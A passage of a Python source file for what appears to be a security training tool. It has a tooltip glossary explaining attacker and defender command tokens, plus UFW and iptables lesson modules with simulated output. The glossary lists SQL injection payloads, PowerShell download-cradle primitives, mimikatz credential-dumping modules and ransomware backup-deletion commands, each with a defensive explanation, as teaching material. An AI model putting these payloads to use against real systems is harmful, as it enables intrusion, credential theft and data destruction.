    "RDP": "Remote Desktop Protocol — port 3389. Lets users log into a remote Windows session.",
    "RDP logon": "Remote Desktop authentication — shows as LogonType 10 in Event 4624.",
    "SMB": "Server Message Block — Windows file sharing protocol. Port 445.",
    "shares": "Network folders shared via SMB — C$ (admin), IPC$, and user-created shares.",
    "Windows Firewall": "Built-in host firewall — controlled via New-NetFirewallRule or netsh advfirewall.",
    "WFP": "Windows Filtering Platform — the kernel-level firewall engine that New-NetFirewallRule configures.",
    "Defender": "Windows Defender Antivirus — Microsoft's built-in AV.",
    "Windows Defender": "Microsoft's built-in antivirus.",
    "Credential Guard": "Virtualization-based security feature that prevents LSASS memory access.",
    "PPL": "Protected Process Light — protects LSASS from being opened by non-signed processes.",
    "AMSI": "Antimalware Scan Interface — allows AV to inspect PowerShell and script content in memory.",
    "AppLocker": "Application control policy — allowlists executables, scripts, installers.",
    "WDAC": "Windows Defender Application Control — modern app control policy.",
    "UAC": "User Account Control — prompts for elevation when an admin tool runs.",

    # ============================================================
    # POWERSHELL EVENT FIELD EXTRACTION
    # ============================================================
    "$_": "The current object in the pipeline.",
    "Properties[0]": "Event 7045: ServiceName field.",
    "Properties[1]": "Event 7045: ImagePath field (executable path).",
    "Properties[2]": "Sysmon 10: source image (process accessing LSASS).",
    "Properties[4]": "Sysmon 1/3: Image field (which process).",
    "Properties[6]": "Sysmon 10: GrantedAccess mask — 0x1410 = credential theft.",
    "Properties[10]": "Sysmon 1: CommandLine — full command that was executed.",
    "Properties[14]": "Sysmon 3: DestinationIp address.",
    "Properties[15]": "Sysmon 3: DestinationPort.",
    "ProviderName": "Which component logged the event (service name, driver, application).",
    "LevelDisplayName": "Human-readable severity: Critical, Error, Warning, Information, Verbose.",
    "TimeCreated": "When the event was logged (timestamp).",
    "Message": "The full human-readable event description.",
    "Id": "The Event ID — the numeric identifier that tells you what kind of event it is.",
    "Account": "The user account the event is about.",
    "TargetUserName": "The account being logged into or targeted.",
    "IpAddress": "The source IP the event came from.",
    "IpPort": "The source port the event came from.",
    "WorkstationName": "The machine name that originated the request.",
    "LogonGuid": "Unique identifier for a specific logon session — useful for correlating events.",
    "SubjectUserName": "The account that PERFORMED the action (may differ from TargetUserName).",
    "ServiceName": "The name of a service that was installed or started.",
    "ImagePath": "The filesystem path to an executable — legitimate services live in System32 or Program Files.",

    # ============================================================
    # ATTACK & DEFEND — ATTACKER TOOLS
    # ============================================================
    "nmap": "Network Mapper — the industry-standard port scanner. Discovers open ports, services, and OS versions.",
    "-sV": "Nmap: version detection. Probes open ports to identify the exact service + version running.",
    "-p": "Nmap: specify ports to scan. Example: -p 22,80,443 or -p 1-65535.",
    "-p-": "Nmap shorthand: scan all 65535 TCP ports.",
    "ssh://203.0.113.10": "Attacker target — a public-facing SSH server.",
    "hydra": "Parallelized login brute forcer. Supports SSH, FTP, HTTP, RDP, MySQL, and 50+ protocols.",
    "-l": "hydra: single username. Use -L for a username list file.",
    "-P": "hydra: password list file. -p is a single password.",
    "/usr/share/wordlists/rockyou.txt": "The classic 14M-password leaked list. Default wordlist for credential attacks.",
    "rockyou.txt": "14 million real-world leaked passwords. Present in every pentest toolkit.",
    "sqlmap": "Automated SQL injection detection and exploitation framework.",
    "sqlmap -u": "sqlmap: target URL. Example: -u 'http://target/product.php?id=1'",
    "--dbs": "sqlmap: enumerate all databases on the target server.",
    "--dump": "sqlmap: extract the full contents of a table.",
    "-D": "sqlmap: specify a database by name.",
    "-T": "sqlmap: specify a table by name.",
    "--batch": "sqlmap: never prompt for input — run automated.",
    "crackmapexec": "Swiss-army knife for pentesting Windows/AD networks. SMB, LDAP, WinRM, MSSQL, and more.",
    "smb": "Server Message Block — Windows file sharing protocol on port 445.",
    "-u": "crackmapexec: username.",
    "-H": "crackmapexec: NTLM hash instead of plaintext password (Pass-the-Hash).",
    "--shares": "crackmapexec: enumerate SMB shares on the target.",
    "-x": "crackmapexec: execute a command on the target via SMB.",
    "-ep bypass": "PowerShell: ExecutionPolicy Bypass. Runs scripts even when disabled by policy.",
    "-nop": "PowerShell: NoProfile. Skips loading the user's PowerShell profile (faster, cleaner).",
    "-w hidden": "PowerShell: hidden window. Runs without showing a console window.",
    "IEX": "PowerShell: Invoke-Expression. Executes a string as code — the classic download cradle primitive.",
    "Invoke-Expression": "PowerShell cmdlet that executes a string as PowerShell code. Attacker favorite.",
    "DownloadString": "PowerShell .NET method that fetches a URL into memory. Often used with IEX for fileless attacks.",
    "New-Object Net.WebClient": "PowerShell: creates an HTTP client object. Used to fetch remote payloads.",
    "mimikatz.exe": "The classic Windows credential dumping tool. Always malicious on a workstation.",
    "m.exe": "Disguised copy of mimikatz. Attackers rename it to evade signature detection.",
    "sekurlsa::logonpasswords": "Mimikatz module: dumps plaintext passwords and NTLM hashes from LSASS memory.",
    "lsadump::sam": "Mimikatz module: dumps local SAM hashes (workstation accounts).",
    "curl -X POST": "Send an HTTP POST request. Used to submit login forms and file uploads.",
    "-F": "curl: multipart form field. -F 'file=@shell.php' uploads a file.",
    "-c cookies.txt": "curl: save cookies from the response to a file for later requests.",
    "shell.php": "A web shell — a PHP file that executes OS commands on the server.",
    "?cmd=": "Query parameter passed to a web shell to specify the OS command to run.",
    "vssadmin": "Windows tool for managing Volume Shadow Copies. Attackers use it to DELETE backups.",
    "vssadmin delete shadows": "Destroys all shadow copies — prevents file restoration without a backup. Ransomware first step.",
    "wbadmin": "Windows Backup Admin CLI. Ransomware uses 'wbadmin delete catalog' to destroy the backup catalog.",
    "bcdedit": "Windows Boot Configuration Editor. Ransomware uses it to disable recovery mode.",
    "bcdedit /set recoveryenabled No": "Disables Windows Recovery Environment — a common ransomware precursor.",
    "tar czf": "Create a gzip-compressed tar archive. Used for staging data before exfiltration.",
    "scp": "Secure Copy — transfers files over SSH. Used by attackers for exfiltration.",
    "attacker@198.51.100.42": "The attacker's C2 (command-and-control) server.",
    "invoice.docm": "A Word document with macros enabled. Common phishing payload.",
    "invoice_2024_3892.docm": "Phishing attachment — macro-enabled Word doc disguised as an invoice.",

    # ============================================================
    # ATTACK & DEFEND — EXPLOITS & PAYLOADS
    # ============================================================
    "' OR '1'='1": "Classic SQL injection payload — makes the WHERE clause always true.",
    "' OR 1=1 --": "SQL injection: forces the query to return all rows, then comments out the rest.",
    "UNION SELECT": "SQL injection technique: appends a second query to retrieve data from other tables.",
    "UNION SELECT 1,user(),database()": "SQLi payload that leaks the current DB user and database name.",
    "AND SLEEP(5)": "Time-based blind SQLi — forces a 5-second delay to confirm injection.",
    "AND 1=1": "Boolean-based SQLi — if the page responds normally, the injection is valid.",
    "admin' OR '1'='1' --": "Auth bypass payload — logs in as the first row (usually admin) without a valid password.",
    "MD5": "Legacy hash function (128-bit). Broken for password storage — crackable with rainbow tables.",
    "5f4dcc3b5aa765d61d8327deb882cf99": "MD5 hash of the word 'password'. Example leaked credential.",
    "NTLM": "Windows authentication protocol. Uses password hashes, vulnerable to Pass-the-Hash attacks.",
    "Pass-the-Hash": "Attack that uses a stolen NTLM hash to authenticate without knowing the plaintext password.",
    "Golden Ticket": "Forged Kerberos TGT using the KRBTGT hash — grants unlimited domain access.",
    "KRBTGT": "The Kerberos Ticket Granting Ticket account. Compromising it = total domain compromise.",
    "Kerberoasting": "Attack that requests RC4 service tickets for offline cracking.",
    "DCSync": "Attack that impersonates a domain controller to pull password hashes via DRSUAPI.",

    # ============================================================
    # ATTACK & DEFEND — DEFENDER TOOLS
    # ============================================================
    "Get-MessageTrace": "Exchange PowerShell cmdlet: trace email delivery across the organization.",
    "Get-WinEvent": "PowerShell: query Windows event logs. Fast with -FilterHashtable.",
    "Get-ADUser": "PowerShell: retrieve Active Directory user objects.",
    "Set-ADAccountPassword": "PowerShell: reset an AD user's password.",
    "Disable-ADAccount": "PowerShell: disable an AD account. Prevents all logons.",
    "Get-ADGroupMember": "PowerShell: list members of an AD group (e.g., Domain Admins).",
    "Set-ADAccountPassword -Reset": "PowerShell: force-reset an AD account password.",
    "Get-NetTCPConnection": "PowerShell: list TCP connections with owning process.",
    "New-NetFirewallRule": "PowerShell: create a Windows Firewall rule — block an attacker instantly.",
    "-RemoteAddress": "New-NetFirewallRule: match a specific remote IP address.",
    "-Action Block": "New-NetFirewallRule: drop matching packets silently.",
    "-Direction Outbound": "New-NetFirewallRule: apply to outbound traffic (blocks C2 callbacks).",
    "Reset-KrbtgtPassword": "Custom script: resets the KRBTGT password twice to invalidate Golden Tickets.",
    "fail2ban": "Linux daemon that watches logs and bans IPs after repeated failures.",
    "systemctl enable --now": "systemd: enable + start a service in one command.",
    "PasswordAuthentication no": "SSH config: disable password auth — force keys only.",
    "/etc/ssh/sshd_config": "SSH daemon configuration file on Linux.",
    "iptables -I INPUT": "Insert an iptables rule at the top of the INPUT chain (highest priority).",
    "iptables -A OUTPUT": "Append an iptables rule to the OUTPUT chain (outbound traffic).",
    "iptables -A INPUT -s": "iptables: block all traffic from a specific source IP.",
    "-j DROP": "iptables: silently discard matching packets.",
    "iptables -F": "iptables: flush all rules. Dangerous remotely.",
    "ss -tnp": "Linux: list TCP connections with owning process.",
    "mysqldump": "MySQL: export databases as SQL text — for backups or evidence.",
    "ALTER USER": "MySQL: change a user's password or authentication method.",
    "GRANT SELECT, INSERT": "MySQL: give a user permission to read/write specific tables only.",
    "information_schema.processlist": "MySQL system table: view active sessions and running queries.",
    "mysql.user": "MySQL system table: list all users and their allowed source hosts.",
    "parameterized queries": "Prepared statements that treat user input as DATA, not SQL code. Prevents SQLi.",
    "pdo->prepare": "PHP: prepared statement. The correct way to run SQL with user input.",
    "system()": "PHP function that executes OS commands. Common in web shells.",
    "shell_exec": "PHP function that runs a shell command and returns output. Attacker favorite.",
    "eval()": "PHP function that executes a string as PHP code. Dangerous if user-controlled.",
    "PHPSESSID": "Cookie name for PHP session ID. Stealing it = session hijacking.",
    "config.php": "Common PHP config file. Often contains DB credentials in plaintext.",
    "define('DB_PASSWORD'": "PHP constant definition for the database password. Read by attackers post-compromise.",
    "uploads/": "Web directory where users upload files. Should NEVER execute PHP.",

    # ============================================================
    # ATTACK & DEFEND — WINDOWS EVENT IDs
    # ============================================================
    "Sysmon Event 1": "Process Create — full command line + parent process. Best detection source.",
    "Sysmon Event 3": "Network Connect — which process connected to which IP.",
    "Sysmon Event 10": "Process Access — LSASS access here = credential theft. Highest-priority alert.",
    "Sysmon Event 11": "File Create — catches dropped payloads and ransomware encryption.",
    "4624": "Successful logon — records type (2, 3, 10, etc.) and source IP.",
    "4625": "Failed logon — burst from one IP = brute force.",
    "4648": "Logon with explicit credentials — runas-style, rare in normal environments.",
    "4672": "Special privileges assigned — fires when admin logs in.",
    "4688": "Process created — requires command-line auditing to show arguments.",
    "4697": "Service installed (Security channel) — persistence indicator.",
    "4698": "Scheduled task created — common persistence mechanism.",
    "4720": "User account created — watch for new admin accounts.",
    "4726": "User account deleted.",
    "4732": "Member added to local group — privilege escalation indicator.",
    "4740": "Account locked out — result of repeated failed logons.",
    "1102": "Security log cleared — NO legitimate reason. Always suspicious.",
    "4104": "PowerShell script block — captures deobfuscated script content.",
    "7045": "Service installed (System channel) — check ImagePath for suspicious paths.",

    # ============================================================
    # ATTACK & DEFEND — LOG FILES & PATHS
    # ============================================================
    "/var/log/auth.log": "Linux: SSH, sudo, su, PAM authentication events.",
    "/var/log/apache2/access.log": "Apache: every HTTP request (IP, URL, status, User-Agent).",
    "/var/log/apache2/error.log": "Apache: PHP errors, permission denials, exploit attempts.",
    "/var/log/syslog": "Linux: general system log (services, kernel, cron).",
    "/var/log/audit/audit.log": "auditd kernel-level syscall and file access trail.",
    "/var/log/ufw.log": "UFW firewall: every packet blocked or allowed.",
    "/etc/passwd": "Linux user accounts. World-readable.",
    "/etc/shadow": "Linux password hashes. Root-only.",
    "/etc/group": "Linux groups and their members.",
    "C:\\Users\\Public": "World-writable Windows folder — common malware drop location.",
    "C:\\Users\\Public\\m.exe": "Attacker-dropped Mimikatz binary. Path is highly suspicious.",
    "C:\\Windows\\System32": "The correct location for Windows system executables.",
    "C:\\Windows\\System32\\winevt\\Logs\\": "Directory containing all .evtx event log files.",

    # ============================================================
    # ATTACK & DEFEND — CONCEPTS
    # ============================================================
    "C2": "Command and Control — attacker's server that manages compromised machines.",
    "C2 server": "The attacker-controlled machine that sends commands to implants.",
    "beaconing": "Regular, automated callback from malware to C2 (e.g., every 60 seconds).",
    "lateral movement": "Technique for moving from one compromised host to another within a network.",
    "persistence": "Techniques for maintaining access across reboots (services, cron, Run keys).",
    "privesc": "Privilege escalation — moving from a normal user to root/admin.",
    "SUID": "Linux permission bit that runs a binary as its owner (often root).",
    "sudo -l": "Linux: list the sudo commands the current user is allowed to run.",
    "NAT": "Network Address Translation — hides internal IPs behind one public IP.",
    "TGT": "Ticket Granting Ticket — Kerberos credential that proves your identity.",
    "TGS": "Ticket Granting Service — Kerberos ticket for a specific service.",
    "SAM": "Windows Security Account Manager — stores local user password hashes.",
    "LSASS": "Windows process that holds password hashes and Kerberos tickets in memory.",
    "WAF": "Web Application Firewall — inspects HTTP for attack patterns.",
    "IDOR": "Insecure Direct Object Reference — accessing objects by manipulating IDs.",
    "RCE": "Remote Code Execution — running attacker code on the target.",
    "SQLi": "SQL Injection — inserting SQL code into user input to manipulate queries.",
    "XSS": "Cross-Site Scripting — injecting JavaScript into pages viewed by others.",
    "CSRF": "Cross-Site Request Forgery — tricking a user's browser into making unwanted requests.",
    "DDoS": "Distributed Denial of Service — overwhelming a target with traffic.",
    "IOC": "Indicator of Compromise — evidence that a system has been breached.",
    "SIEM": "Security Information and Event Management — central log + alert platform.",
    "EDR": "Endpoint Detection and Response — endpoint agent that detects and responds to threats.",
    "SOC": "Security Operations Center — team that monitors and responds to incidents.",
    "Tier 1": "SOC Tier 1 — first-line analyst. Handles initial triage of alerts.",
    "Tier 2": "SOC Tier 2 — deeper investigation, incident response, containment.",
    "Chain of Custody": "Documented, unbroken trail of evidence handling — required for legal use.",
    "FIM": "File Integrity Monitoring — detects unauthorized changes to files.",
    "P1": "Priority 1 — highest-severity incident. Page on-call immediately.",

}


def annotate_command(cmd):
    """Split a command into tokens and attach a tooltip to each."""
    import re
    if not cmd:
        return []
    tokens = re.findall(r'"[^"]*"|\'[^\']*\'|\S+', cmd)
    parts = []
    for tok in tokens:
        key = tok.strip('"\'')
        tip = COMMAND_TOOLTIPS.get(tok) or COMMAND_TOOLTIPS.get(key)
        if not tip:
            for k, v in COMMAND_TOOLTIPS.items():
                if k and (k in tok or tok in k):
                    tip = v
                    break
        parts.append({"text": tok, "tip": tip or ""})
    return parts


# ==================================================================
#  MODULE REGISTRY
# ==================================================================
MODULES = {}

# ==================== MODULE: UFW ====================
UFW_COMMANDS = [
    {"id": "ufw_1", "category": "Install", "color": "#3498db",
     "cmd": "sudo apt update",
     "desc": "Refresh the package index before installing",
     "scenario": "First step on any new server. Updates the list of available packages so you install the latest UFW version.",
     "output": "Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\nGet:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]\nReading package lists... Done",
     "simulation": [
         {"from": "apt", "to": "Ubuntu mirrors", "data": "GET /InRelease", "title": "Read package lists", "desc": "apt reads sources.list and fetches package indexes", "color": "#3498db"},
         {"from": "apt", "to": "/var/lib/apt/lists/", "data": "Updated cache", "title": "Store locally", "desc": "New package lists written to disk", "color": "#f39c12"},
         {"from": "apt", "to": "Terminal", "data": "Done", "title": "Ready", "desc": "apt is now up to date", "color": "#27ae60"}
     ]},
    {"id": "ufw_2", "category": "Install", "color": "#3498db",
     "cmd": "sudo apt install ufw",
     "desc": "Install UFW firewall",
     "scenario": "On Ubuntu UFW is usually preinstalled. On Debian minimal or cloud VMs you may need to install it.",
     "output": "Reading package lists... Done\nThe following NEW packages will be installed:\n  ufw\nSetting up ufw (0.36.1) ...\nInstallation complete.",
     "simulation": [
         {"from": "apt", "to": "Ubuntu repo", "data": "ufw_0.36.1.deb", "title": "Download .deb", "desc": "Package fetched from the Ubuntu mirror", "color": "#3498db"},
         {"from": "dpkg", "to": "/usr/sbin/", "data": "ufw binary", "title": "Unpack binary", "desc": "dpkg extracts the ufw executable", "color": "#f39c12"},
         {"from": "systemd", "to": "/etc/", "data": "ufw.service", "title": "Install service", "desc": "systemd unit files placed in /etc", "color": "#27ae60"}
     ]},
    {"id": "ufw_3", "category": "Enable", "color": "#f39c12",
     "cmd": "sudo ufw default deny incoming",
     "desc": "Set default policy: DROP all incoming traffic",
     "scenario": "The foundation of a secure firewall. Any packet that doesn't match an ALLOW rule gets dropped.",
     "output": "Default incoming policy changed to 'deny'\n(be sure to update your rules accordingly)",
     "simulation": [
         {"from": "ufw", "to": "/etc/default/ufw", "data": "DEFAULT_INPUT_POLICY=\"DROP\"", "title": "Write policy", "desc": "UFW updates its config file", "color": "#f39c12"},
         {"from": "/etc/default/ufw", "to": "iptables", "data": "iptables -P INPUT DROP", "title": "Apply at kernel", "desc": "The chain policy is set to DROP", "color": "#e74c3c"},
         {"from": "iptables", "to": "Any inbound packet", "data": "No rule match → DROP", "title": "Default action", "desc": "Unmatched traffic is silently dropped", "color": "#c0392b"}
     ]},
    {"id": "ufw_4", "category": "Enable", "color": "#f39c12",
     "cmd": "sudo ufw default allow outgoing",
     "desc": "Allow all outgoing traffic from this machine",
     "scenario": "Your server still needs to reach the internet — apt updates, DNS lookups, NTP sync.",
     "output": "Default outgoing policy changed to 'allow'\n(be sure to update your rules accordingly)",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "iptables -P OUTPUT ACCEPT", "title": "Set OUTPUT ACCEPT", "desc": "Outgoing chain default becomes ACCEPT", "color": "#27ae60"},
         {"from": "Your server", "to": "Internet", "data": "Any outbound allowed", "title": "Traffic flows", "desc": "Server can reach internet freely", "color": "#27ae60"}
     ]},
    {"id": "ufw_5", "category": "Enable", "color": "#e74c3c",
     "cmd": "sudo ufw allow ssh",
     "desc": "Allow SSH BEFORE enabling the firewall — CRITICAL",
     "scenario": "⚠️ If you enable UFW without allowing SSH first and you're remote, you will be locked out permanently.",
     "output": "Rules updated\nRules updated (v6)",
     "simulation": [
         {"from": "ufw", "to": "/etc/services", "data": "ssh = 22/tcp", "title": "Resolve service", "desc": "UFW looks up 'ssh' in /etc/services", "color": "#3498db"},
         {"from": "ufw", "to": "iptables", "data": "ACCEPT tcp dport 22", "title": "Add rule", "desc": "Rule inserted in INPUT chain", "color": "#27ae60"},
         {"from": "iptables", "to": "SSH traffic", "data": "ALLOWED", "title": "SSH works", "desc": "You can now safely enable UFW", "color": "#27ae60"}
     ]},
    {"id": "ufw_6", "category": "Enable", "color": "#e74c3c",
     "cmd": "sudo ufw enable",
     "desc": "Turn the firewall ON",
     "scenario": "From this moment every incoming packet is checked against your rules.",
     "output": "Command may disrupt existing ssh connections. Proceed with operation (y|n)? y\nFirewall is active and enabled on system startup",
     "simulation": [
         {"from": "ufw", "to": "User", "data": "y/n prompt", "title": "Confirm", "desc": "Asks for confirmation before activating", "color": "#f39c12"},
         {"from": "ufw", "to": "iptables", "data": "Load all rules", "title": "Push rules", "desc": "Every UFW rule is loaded into the kernel", "color": "#3498db"},
         {"from": "Firewall", "to": "Kernel", "data": "Active", "title": "Filtering", "desc": "Firewall is now enforcing rules", "color": "#27ae60"}
     ]},
    {"id": "ufw_7", "category": "Enable", "color": "#27ae60",
     "cmd": "sudo ufw status verbose",
     "desc": "Verify firewall state",
     "scenario": "Always confirm after enabling. 'Status: active' means it's filtering.",
     "output": "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing)\n\nTo       Action      From\n--       ------      ----\n22/tcp   ALLOW IN    Anywhere",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "iptables -L -n", "title": "Query kernel", "desc": "Reads current active rules", "color": "#3498db"},
         {"from": "iptables", "to": "ufw", "data": "Current rules", "title": "Return rules", "desc": "Kernel returns every active rule", "color": "#f39c12"},
         {"from": "ufw", "to": "Terminal", "data": "Formatted output", "title": "Display", "desc": "Human-readable status summary", "color": "#27ae60"}
     ]},
    {"id": "ufw_8", "category": "Common Rules", "color": "#27ae60",
     "cmd": "sudo ufw allow 80/tcp",
     "desc": "Allow HTTP on port 80",
     "scenario": "Web server needs port 80 open for HTTP traffic.",
     "output": "Rule added\nRule added (v6)",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "ACCEPT tcp dport 80", "title": "Add HTTP rule", "desc": "Rule inserted in INPUT chain", "color": "#27ae60"},
         {"from": "Web visitor", "to": "Your server:80", "data": "GET /", "title": "Traffic allowed", "desc": "Web requests now reach the server", "color": "#27ae60"}
     ]},
    {"id": "ufw_9", "category": "Common Rules", "color": "#27ae60",
     "cmd": "sudo ufw allow 443/tcp",
     "desc": "Allow HTTPS on port 443",
     "scenario": "Modern websites serve encrypted HTTPS.",
     "output": "Rule added\nRule added (v6)",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "ACCEPT tcp dport 443", "title": "Add HTTPS rule", "desc": "Rule inserted in INPUT chain", "color": "#27ae60"},
         {"from": "Browser", "to": "Your server:443", "data": "TLS handshake", "title": "HTTPS works", "desc": "Encrypted traffic reaches the server", "color": "#27ae60"}
     ]},
    {"id": "ufw_10", "category": "Common Rules", "color": "#e74c3c",
     "cmd": "sudo ufw allow 3306/tcp",
     "desc": "Allow MySQL from anywhere — DANGEROUS",
     "scenario": "⚠️ NEVER do this on a public server. MySQL exposed to the internet is a top target.",
     "output": "Rule added\nRule added (v6)",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "ACCEPT 3306 from anywhere", "title": "Open MySQL", "desc": "Port 3306 now accepts from any IP", "color": "#e74c3c"},
         {"from": "Attacker", "to": "Your server:3306", "data": "Login attempt", "title": "Scan targets DB", "desc": "Shodan finds it within minutes", "color": "#c0392b"}
     ]},
    {"id": "ufw_11", "category": "Common Rules", "color": "#27ae60",
     "cmd": "sudo ufw allow from 192.168.1.0/24",
     "desc": "Allow entire subnet (trusted LAN)",
     "scenario": "Trust every device on your office or home subnet.",
     "output": "Rule added",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "src 192.168.1.0/24 → ACCEPT", "title": "Trust subnet", "desc": "Every IP in that /24 gets allowed", "color": "#27ae60"},
         {"from": "Any LAN device", "to": "Your server", "data": "Any port", "title": "LAN access", "desc": "Whole subnet can reach any port", "color": "#27ae60"}
     ]},
    {"id": "ufw_12", "category": "Common Rules", "color": "#27ae60",
     "cmd": "sudo ufw allow from 192.168.1.50 to any port 22",
     "desc": "Allow SSH only from a specific IP",
     "scenario": "Most secure SSH rule: only your trusted IP can reach SSH.",
     "output": "Rule added",
     "simulation": [
         {"from": "Attacker", "to": "Your server:22", "data": "SYN", "title": "Attacker fails", "desc": "Any IP except 192.168.1.50 hits default deny", "color": "#e74c3c"},
         {"from": "Trusted IP 192.168.1.50", "to": "Your server:22", "data": "SYN", "title": "Trusted IP passes", "desc": "Only whitelisted IP allowed", "color": "#27ae60"}
     ]},
    {"id": "ufw_13", "category": "Common Rules", "color": "#e74c3c",
     "cmd": "sudo ufw deny from 203.0.113.5",
     "desc": "Block a specific attacker IP",
     "scenario": "The most common incident-response action.",
     "output": "Rule added",
     "simulation": [
         {"from": "Attacker 203.0.113.5", "to": "Firewall", "data": "SYN", "title": "Attacker sends", "desc": "Every packet from this IP is matched", "color": "#e74c3c"},
         {"from": "Firewall", "to": "Attacker", "data": "(no response)", "title": "Silent drop", "desc": "Attacker sees only timeout", "color": "#c0392b"}
     ]},
    {"id": "ufw_14", "category": "Advanced", "color": "#9b59b6",
     "cmd": "sudo ufw limit ssh",
     "desc": "Rate-limit SSH — best practice",
     "scenario": "Auto-defends against brute force. More than 6 SSH connections in 30s triggers a 30s block.",
     "output": "Rule added\nRule added (v6)",
     "simulation": [
         {"from": "Legit user", "to": "SSH:22", "data": "Connection 1", "title": "Normal use", "desc": "Legitimate logins work fine", "color": "#27ae60"},
         {"from": "Attacker", "to": "SSH:22", "data": "Attempts 7, 8, 9...", "title": "Brute force flood", "desc": "Too many in short window", "color": "#f39c12"},
         {"from": "ufw", "to": "Attacker", "data": "BLOCKED for 30s", "title": "Auto-block", "desc": "Rate limit triggered", "color": "#c0392b"}
     ]},
    {"id": "ufw_15", "category": "Advanced", "color": "#9b59b6",
     "cmd": "sudo ufw logging on",
     "desc": "Enable logging to /var/log/ufw.log",
     "scenario": "Every blocked and allowed packet gets logged. Essential for incident response.",
     "output": "Logging enabled",
     "simulation": [
         {"from": "ufw", "to": "Config", "data": "LOGLEVEL=low", "title": "Set log level", "desc": "Logs all blocked packets", "color": "#3498db"},
         {"from": "iptables", "to": "/var/log/ufw.log", "data": "UFW BLOCK ...", "title": "Packets logged", "desc": "Every block event written to disk", "color": "#f39c12"},
         {"from": "Admin", "to": "ufw.log", "data": "grep 'UFW BLOCK'", "title": "Investigate", "desc": "See who's attacking and when", "color": "#27ae60"}
     ]},
    {"id": "ufw_16", "category": "Emergency", "color": "#e74c3c",
     "cmd": "sudo ufw disable",
     "desc": "Turn off firewall (locked-out recovery)",
     "scenario": "🔴 Emergency only. If locked out, disable the firewall to regain access.",
     "output": "Firewall stopped and disabled on system startup",
     "simulation": [
         {"from": "ufw", "to": "iptables", "data": "iptables -P INPUT ACCEPT", "title": "Set ACCEPT", "desc": "Default policy becomes permissive", "color": "#e74c3c"},
         {"from": "Your server", "to": "Internet", "data": "Fully open", "title": "⚠️ Unfiltered", "desc": "Every port is now exposed", "color": "#c0392b"}
     ]},
    {"id": "ufw_17", "category": "Emergency", "color": "#e74c3c",
     "cmd": "sudo ufw reset",
     "desc": "Remove all rules, start fresh",
     "scenario": "Nuclear option when the rule set is too tangled.",
     "output": "Resetting all rules to installed defaults...\nBacking up 'user.rules' to '/etc/ufw/user.rules.20240115_142345'",
     "simulation": [
         {"from": "ufw", "to": "/etc/ufw/", "data": "Backup user.rules", "title": "Backup first", "desc": "Old rules saved with timestamp", "color": "#f39c12"},
         {"from": "ufw", "to": "iptables", "data": "iptables -F", "title": "Flush all", "desc": "Every rule removed from kernel", "color": "#e74c3c"},
         {"from": "Admin", "to": "Firewall", "data": "Rebuild rules", "title": "Start over", "desc": "Add rules from clean state", "color": "#27ae60"}
     ]},
]

IPTABLES_COMMANDS = [
    {"id": "ipt_1", "category": "View", "color": "#3498db",
     "cmd": "sudo iptables -L -n -v",
     "desc": "List all rules with packet/byte counters",
     "scenario": "First command to debug firewall behavior. Counters show which rules are actually being hit.",
     "output": "Chain INPUT (policy DROP 1234 packets)\n pkts bytes target prot opt source      destination\n  145 10860 ACCEPT tcp  --  0.0.0.0/0   0.0.0.0/0 tcp dpt:22",
     "simulation": [
         {"from": "iptables", "to": "Kernel", "data": "GetRules", "title": "Query kernel", "desc": "Reads every active rule from netfilter", "color": "#3498db"},
         {"from": "iptables", "to": "Terminal", "data": "Table output", "title": "Display", "desc": "Formatted as readable table", "color": "#27ae60"}
     ]},
    {"id": "ipt_2", "category": "Basics", "color": "#27ae60",
     "cmd": "sudo iptables -A INPUT -i lo -j ACCEPT",
     "desc": "Allow loopback interface (127.0.0.1)",
     "scenario": "CRITICAL rule. Without this, local services can't talk to each other.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "iptables", "to": "Kernel", "data": "ACCEPT if in=lo", "title": "Add rule", "desc": "Rule appended to INPUT chain", "color": "#27ae60"},
         {"from": "App A", "to": "App B (127.0.0.1)", "data": "Local connection", "title": "Loopback works", "desc": "Local traffic unaffected", "color": "#27ae60"}
     ]},
    {"id": "ipt_3", "category": "Basics", "color": "#27ae60",
     "cmd": "sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
     "desc": "Allow reply packets for existing connections",
     "scenario": "MUST HAVE. Without this, your server can send outbound but never receive replies.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "Your server", "to": "google.com:443", "data": "SYN (outbound)", "title": "Outbound starts", "desc": "Server initiates HTTPS request", "color": "#3498db"},
         {"from": "google.com", "to": "Your server", "data": "SYN-ACK", "title": "Reply arrives", "desc": "Reply matches ESTABLISHED state", "color": "#f39c12"},
         {"from": "Firewall", "to": "Your server", "data": "ACCEPT", "title": "Reply passes", "desc": "Connection completes", "color": "#27ae60"}
     ]},
    {"id": "ipt_4", "category": "Basics", "color": "#e74c3c",
     "cmd": "sudo iptables -P INPUT DROP",
     "desc": "Set default policy: DROP all unmatched input",
     "scenario": "The core hardening step. After all ALLOW rules are in place, set default to DROP.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "iptables", "to": "Kernel", "data": "iptables -P INPUT DROP", "title": "Set policy", "desc": "Default action for INPUT becomes DROP", "color": "#e74c3c"},
         {"from": "Unknown packet", "to": "Firewall", "data": "No match", "title": "Unmatched", "desc": "Packet doesn't match any ALLOW rule", "color": "#f39c12"},
         {"from": "Firewall", "to": "Void", "data": "(dropped)", "title": "Default DROP", "desc": "Silently discarded", "color": "#c0392b"}
     ]},
    {"id": "ipt_5", "category": "Basics", "color": "#e74c3c",
     "cmd": "sudo iptables -A INPUT -s 203.0.113.5 -j DROP",
     "desc": "Block a specific attacker IP",
     "scenario": "Incident response: block the source of an attack instantly.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "Attacker 203.0.113.5", "to": "Firewall", "data": "Any packet", "title": "Attacker sends", "desc": "Every packet from this IP hits the rule", "color": "#e74c3c"},
         {"from": "Firewall", "to": "Attacker", "data": "No reply", "title": "Silent drop", "desc": "Attacker's connection times out", "color": "#c0392b"}
     ]},
    {"id": "ipt_6", "category": "Advanced", "color": "#9b59b6",
